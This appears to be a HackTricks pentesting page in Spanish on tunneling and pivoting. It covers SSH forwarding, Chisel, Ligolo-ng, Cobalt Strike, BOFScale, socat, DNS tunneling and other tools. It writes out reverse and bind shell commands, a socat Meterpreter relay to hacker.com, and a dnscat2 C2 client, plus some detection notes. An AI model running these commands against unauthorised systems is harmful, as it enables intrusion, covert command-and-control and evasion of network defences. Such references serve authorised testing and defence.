# Tunneling y Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Consejo de Nmap

> [!WARNING]
> El soporte de proxy de Nmap está limitado a conexiones TCP y no afecta a los escaneos de ping, puertos o detección del sistema operativo. Cuando el scanner está detrás de un proxy SOCKS, **desactiva el descubrimiento de hosts** (`-Pn`) y utiliza un **escaneo de conexión TCP** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

El comando final utiliza las opciones `-u` y `-i` de Evil-WinRM para identificar la cuenta y el host de WinRM; su puerto de WinRM predeterminado es el 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH puede reenviar conexiones X11, puertos TCP arbitrarios y sockets de dominio Unix a través de su canal cifrado.<sup>[[6]](#references)</sup>

Conexión gráfica SSH (X)

`-Y` habilita el reenvío X11 de confianza y `-C` solicita compresión para los datos reenviados.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Abrir un puerto nuevo en el SSH Server --> Otro puerto

El forwarding remoto (`-R`) escucha en el SSH server y se conecta al lado local; la dirección de enlace explícita controla qué interfaces pueden acceder a ese listener.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Puerto local --> Host comprometido (SSH) --> Tercer_host:Puerto

El forwarding local (`-L`) escucha en el cliente y se conecta al destino desde el lado del servidor SSH.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Puerto local --> Host comprometido (SSH) --> Cualquier lugar

El forwarding dinámico (`-D`) crea un listener local SOCKS4/SOCKS5 cuyas conexiones se abren desde el lado remoto.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Multi-hop con ProxyJump

`-J`/`ProxyJump` se conecta al objetivo a través de uno o más jump hosts separados por comas. Las opciones de forwarding siguen perteneciendo a la conexión SSH final, por lo que el listener SOCKS de abajo abre destinos desde `internal-target`, no desde el primer bastion. Esto evita iniciar sesión en un jump host y ejecutar allí un segundo cliente SSH.<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
Las opciones específicas del host para las jump machines deben colocarse en `~/.ssh/config`; la configuración de la línea de comandos destinada al destino no se aplica automáticamente a los hosts intermedios.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Esto resulta útil para obtener reverse shells desde hosts internos a través de una DMZ hasta tu host:

La configuración `GatewayPorts` del servidor controla si un remote forward puede enlazarse más allá de loopback; su valor predeterminado es `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Este ejemplo basado en `root` crea dispositivos de túnel en ambos hosts. El servidor debe permitir el forwarding de tun y la cuenta seleccionada debe tener acceso al dispositivo tun; `PermitRootLogin yes` es una forma de usar la cuenta `root` aquí.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Habilitar el reenvío en el lado del servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Establecer una nueva ruta en el lado del cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Seguridad – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 añadió una extensión strict-KEX para contrarrestar el ataque de integridad del transporte inicial de Terrapin. Actualiza ambos peers cuando sea posible y sigue las indicaciones del proveedor para implementaciones antiguas en lugar de asumir que un canal reenviado está protegido solo por la versión.<sup>[[8]](#references)</sup>

## SSHUTTLE

Puedes crear un **túnel** mediante **ssh** para dirigir todo el **tráfico** hacia una **subred** a través de un host.\
Por ejemplo, reenviar todo el tráfico dirigido a 10.10.10.0/24

`sshuttle` proporciona proxying transparente mediante SSH y permite seleccionar subredes y un comando SSH personalizado, como se muestra a continuación.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Conectarse con una clave privada
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

El `portfwd` de Metasploit admite forwarding local y remoto, mientras que su módulo de proxy SOCKS está diseñado para funcionar con rutas de sesión o `autoroute` y escucha en el puerto 1080 de forma predeterminada en estos ejemplos.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Puerto local --> Host comprometido (sesión activa) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Otra forma:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

El Beacon de Cobalt Strike puede retransmitir conexiones SOCKS4a/SOCKS5 a través de un Beacon; `rportfwd` se enlaza en el host comprometido, mientras que `rportfwd_local` inicia la conexión con el destino desde el cliente de Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Abre un puerto en el Team Server en las interfaces que deban enrutar el tráfico a través del Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> En este caso, el **puerto se abre en el host de Beacon**, no en el Team Server, y el tráfico se envía al Team Server y desde allí al host:puerto indicado.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
El manual de reverse-forwarding señala el siguiente comportamiento:<sup>[[14]](#references)</sup>

- El reverse port forward de Beacon está diseñado para **tunelizar tráfico hacia el Team Server, no para retransmitirlo entre máquinas individuales**.
- El tráfico se **tuneliza dentro del tráfico C2 de Beacon**, incluidos los enlaces P2P.
- Los puertos altos suelen evitar las restricciones de puertos privilegiados, pero la política del sistema operativo objetivo y los listeners existentes siguen aplicándose.

### rPort2Port local

> [!WARNING]
> En este caso, el **puerto se abre en el host de Beacon**, no en el Team Server, y el **tráfico se envía al cliente de Cobalt Strike** (no al Team Server) y desde allí al host:puerto indicado.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## BOFScale - tailnet con CDN frontal

[BOFScale](https://github.com/NetSPI/BOFscale) ejecuta un overlay de Tailscale modificado dentro de un implante C2 de Windows sin instalar un controlador TUN ni un servicio. Sus tres componentes son un `tailscaled` BOF-PE `c-shared` asíncrono, un pequeño BOF-PE de C++ que se comunica con la API local y un bridge TCP-a-SOCKS5 `socksportfwd` asíncrono.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 y DERP compatibles con CDN

Tailscale normalmente utiliza actualizaciones HTTP propietarias para el canal de control TS2021 basado en Noise y el relay DERP. BOFScale conserva esos flujos de bytes, pero los transporta mediante WebSockets RFC 6455, usando `Sec-WebSocket-Protocol: ts2021` o `derp`, de modo que un origin de Headscale/DERP controlado por el operador pueda situarse detrás de un CDN que solo acepta actualizaciones WebSocket estándar. El cliente parcheado vuelve a intentar TS2021 mediante WebSockets después de un HTTP `500`, vuelve a intentar DERP después de un HTTP `426` y hace que el dialer WebSocket de DERP respete la configuración del proxy del host; el BOF establece `TS_DEBUG_DERP_WS_CLIENT=1` para omitir el primer intento conocido por fallar.<sup>[[53]](#references)[[54]](#references)</sup>

El CDN y el proxy del origin deben conservar las actualizaciones WebSocket para `/ts2021` y `/derp`, reenviar `/key` como HTTP ordinario y desactivar los tiempos de espera internos de lectura/escritura, ya que las sesiones de relay pueden permanecer abiertas indefinidamente. La configuración de Headscale suministrada habilita `verify_clients`, publica únicamente el mapa DERP integrado del operador y deja `derp.urls` vacío para impedir el fallback a relays operados por Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon in-process y control mediante named pipe

Salvo que se sobrescriba, el punto de entrada del BOF inicia `tailscaled` con `-tun=userspace-networking`, `-state mem:` y `-no-logs-no-support`, y después crea un pipe con nombre basado en un UUID. Redirige stdout/stderr de Go mediante un pipe del sistema operativo a la API de salida de Beacon, de modo que el daemon completo y el runtime de Go permanezcan residentes, pero el estado y los logs no se escriban en un directorio de Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

El cliente ligero reproduce la API local HTTP/1.0 de Tailscale a través de ese pipe. Abre el pipe con `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` porque la capa `safesocket` del daemon suplanta al cliente del pipe, envía `Tailscale-Cap: 125` y asigna la API local a operaciones `up`, `down`, `status`, anuncio de rutas y apagado.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> No descargues un BOF-PE de Go mapeado manualmente después de solicitar al daemon que se apague: las goroutines del runtime y del garbage collector pueden continuar ejecutándose desde memoria que el loader desmapea. Ejecuta `tailscaled` en un proceso desechable y termina ese proceso para realizar la limpieza final.<sup>[[54]](#references)</sup>

### Encaminamiento del tráfico originado en el host mediante SOCKS5 en userspace

Las conexiones entrantes del tailnet y las rutas de subred anunciadas funcionan dentro del stack de red en userspace, pero los procesos normales del host comprometido no tienen una ruta del sistema operativo hacia el overlay. Por ello, `socksportfwd` escucha en un puerto TCP orientado a la víctima, negocia SOCKS5 `NO AUTH` con el listener `0.0.0.0:1080` del daemon, emite `CONNECT` para un destino del tailnet y retransmite ambos sentidos de forma asíncrona. Cuando el destino es un nombre de MagicDNS, utiliza `ATYP_DOMAIN`, haciendo que `tailscaled` resuelva el nombre sin exponerlo al resolver de Windows.<sup>[[53]](#references)[[54]](#references)</sup>

A continuación se muestra un flujo mínimo del operador; tanto el nodo del operador como el implante deben utilizar los binarios parcheados porque el Tailscale estándar no puede atravesar este diseño con CDN.<sup>[[53]](#references)[[54]](#references)</sup>
```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```
El forward local puede separar el listener de autenticación aparente de la herramienta de relay: fuerza a una máquina a autenticarse en el puerto vinculado del host comprometido, lo reenvía a través del tailnet hasta `ntlmrelayx` y realiza el relay hacia AD CS, LDAP, HTTP, SMB u otro target compatible. Consulta [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) y [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) para las etapas específicas de la vulnerabilidad; BOFScale solo proporciona el transporte.<sup>[[54]](#references)</sup>

### Detección

Busca la combinación en lugar de un único indicador débil: un runtime de Go en un proceso que normalmente no está basado en Go, un pipe UUID con SDDL permisivo `D:(A;;GA;;;WD)`, un listener SOCKS inesperado en `0.0.0.0:1080` y WebSockets TLS de larga duración hacia direcciones CDN. Con inspección TLS, marca `Sec-WebSocket-Protocol: derp` o `ts2021` cuando el proceso propietario no sea un servicio `tailscaled` autorizado. Las reglas `bofscale.yar` del repositorio proporcionan firmas de memoria para los tres componentes BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

El proyecto proporciona endpoints de web tunnel como `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` y `tunnel.php`; sube un endpoint compatible antes de iniciar el proxy local.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puedes descargarlo desde la página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel transporta tráfico TCP/UDP mediante HTTP usando una conexión protegida por SSH; utiliza builds compatibles de cliente/servidor y verifica la sintaxis de comandos de la release seleccionada.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Reenvío de puertos
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) transporta forwards estáticos o dinámicos mediante WebSocket, HTTP/2 o WebTransport (HTTP/3 sobre QUIC). Las compilaciones actuales admiten TCP, UDP, sockets Unix, stdio, SOCKS5, proxying HTTP y listeners de proxy transparente de Linux, tanto en modos forward como reverse.<sup>[[52]](#references)</sup>

### Pivot SOCKS5 reverse

Ejecuta el servidor en el atacante y haz que el pivot se conecte de forma saliente con `-R`. En esta dirección, el listener SOCKS5 se crea en el **servidor**, mientras que las conexiones solicitadas se originan en la red del **cliente/pivot**.<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
Un reverse static forward utiliza la misma dirección. Por ejemplo, lo siguiente expone `10.10.10.20:445`, tal como se alcanza mediante el pivot, en el puerto loopback `8445`:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Detalles de egress y transporte

- Añade `-p http://user:pass@proxy:8080` al cliente para atravesar un proxy HTTP explícito. Usa `socks5h://127.0.0.1:1080` en clientes como `curl` (o habilita el DNS mediante proxy en la aplicación) para que los nombres internos se resuelvan más allá del túnel, en lugar de filtrarse al resolver local.<sup>[[52]](#references)</sup>
- `wss://` selecciona WebSocket protegido mediante TLS. Un cliente `https://` selecciona HTTP/2, pero el almacenamiento en búfer o la conversión a HTTP/1 por parte de reverse proxies/CDNs suele romper el stream bidireccional; expón directamente el servidor wstunnel al probar este modo.<sup>[[52]](#references)</sup>
- `wts://` selecciona WebTransport sobre QUIC. Inicia el servidor con `--enable-webtransport` (o una URL de escucha `wts://`) y permite UDP en el puerto de escucha. Este modo no puede atravesar un proxy HTTP `CONNECT` convencional porque dicho proxy transporta TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> El proyecto upstream advierte que no se debe tratar su certificado autofirmado integrado como protección de privacidad. Se recomienda usar un certificado personalizado válido junto con `--tls-verify-certificate` (o mTLS), mantener los listeners del proxy en loopback salvo que el acceso remoto sea intencional y tunelizar protocolos que ya sean seguros cuando la confidencialidad sea importante.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

La guía de inicio rápido de Ligolo-ng documenta una interfaz TUN en el proxy, la validación de la huella digital del certificado para el agent y la configuración de rutas para la red tunelizada.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Vinculación y escucha del Agent

Ligolo-ng puede agregar listeners en el agent que reenvían a una dirección del proxy, y su rango reservado `240.0.0.0/4` puede enrutarse para alcanzar servicios locales del agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Acceder a los puertos locales del Access Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot inicia el túnel inverso desde la víctima y expone un proxy SOCKS4 en la dirección de loopback del atacante; su README también documenta las credenciales y opciones de hash del proxy NTLM.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivotar a través de **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat combina tipos de dirección como `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` y `PROXY`; los ejemplos siguientes combinan esos endpoints documentados.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port a través de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter a través de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Puedes atravesar un **proxy sin autenticación** con el tipo de dirección `PROXY` documentado de socat ejecutando esta línea en lugar de la última en la consola de la víctima.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Crea certificados en ambos lados: Cliente y Servidor
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Conecta el puerto SSH local (22) con el puerto 443 del host del atacante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink es la herramienta de conexión de línea de comandos de PuTTY, con opciones de reenvío SSH similares a `ssh`.<sup>[[22]](#references)</sup>

Usa `-P` en mayúscula para el puerto SSH. `-pw` se mantiene por compatibilidad, pero expone la contraseña en la lista de procesos; cuando sea posible, es preferible la autenticación mediante claves o `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Como este binario se ejecutará en la víctima y es un cliente SSH, abre el servicio y el puerto SSH para la conexión inversa; lo siguiente usa `-R` para reenviar un puerto accesible localmente a la máquina del atacante.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Usa un contexto con los permisos requeridos por el host al crear o modificar reglas persistentes de `portproxy`. Microsoft documenta las formas `v4tov4` de adición, visualización y eliminación utilizadas a continuación.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Debes tener **acceso RDP al sistema**.\
Descarga:

SocksOverRDP utiliza Remote Desktop Dynamic Virtual Channels para transportar una conexión SOCKS5 a través de una sesión RDP existente; el plugin del cliente escucha en `127.0.0.1:1080`, mientras que el componente del servidor se ejecuta en el objetivo RDP.<sup>[[25]](#references)</sup>

1. [Binarios x64 de SocksOverRDP](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la característica Remote Desktop Service de Windows. DVC se encarga de **tunelizar paquetes a través de la conexión RDP**.
2. [Binario portable de Proxifier](https://www.proxifier.com/download/#win-tab)

En el equipo cliente, carga **`SocksOverRDP-Plugin.dll`** de esta forma:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ahora podemos **conectarnos** a la **víctima** mediante **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** indicando que el **plugin SocksOverRDP está habilitado**, y que **escuchará** en **127.0.0.1:1080**.

**Conéctate** mediante **RDP** y sube y ejecuta en la máquina víctima el binario `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ahora, confirma en tu máquina (atacante) que el puerto 1080 está escuchando:
```
netstat -antb | findstr 1080
```
Ahora puedes usar [**Proxifier**](https://www.proxifier.com/) para dirigir el tráfico a través de ese puerto.<sup>[[26]](#references)</sup>

## Usar Proxifier con aplicaciones GUI de Windows

Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy usando [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
En **Profile -> Proxy Servers**, añade la IP y el puerto del servidor SOCKS.\
En **Profile -> Proxification Rules**, añade el nombre del programa que quieres proxificar y las conexiones a las IP que quieres proxificar; las reglas de Proxifier pueden coincidir con aplicaciones, hosts de destino y puertos.<sup>[[27]](#references)</sup>

## Tunelizar a través de un proxy NTLM

La herramienta mencionada anteriormente, **Rpivot**, puede retransmitir el tráfico a través de un proxy que autentica mediante NTLM. **OpenVPN** también puede enrutar el tráfico a través de uno cuando se configura con un archivo de autenticación y el método NTLMv2; esto es una travesía del proxy, no un bypass de la autenticación del proxy.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm se autentica en proxies NTLM upstream, expone listeners locales y puede asignar un puerto de túnel local a un servicio de destino; los clientes pueden utilizar ese puerto local.<sup>[[29]](#references)</sup>\
Por ejemplo, ese puerto de reenvío 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Ahora, si configuras, por ejemplo, el servicio **SSH** de la víctima para que escuche en el puerto 443, puedes conectarte a él a través del puerto 2222 del atacante.<sup>[[29]](#references)</sup>\
También podrías usar un **meterpreter** que se conecte a localhost:443 mientras el atacante escucha en el puerto 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) es el toolkit de reverse-proxy .NET de Microsoft. Puedes encontrarlo aquí: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine crea un túnel IPv4 a través de consultas DNS y utiliza interfaces TUN; la configuración documentada requiere los privilegios necesarios para crear esas interfaces en ambos extremos.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
El transporte DNS tiene una sobrecarga mayor que TCP directo y normalmente es lento; puedes crear una conexión SSH comprimida a través de este túnel usando:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Descárgalo desde aquí**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 establece un canal cifrado de command-and-control a través de DNS; los comandos del servidor y del cliente que aparecen a continuación siguen su uso documentado.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **En PowerShell**

Puedes usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para ejecutar un cliente de dnscat2 en PowerShell; su README documenta los parámetros de `Start-Dnscat2` que se muestran a continuación.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding con dnscat**

El comando interactivo `listen` de Dnscat2 asigna un listener local a un host y puerto remotos.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
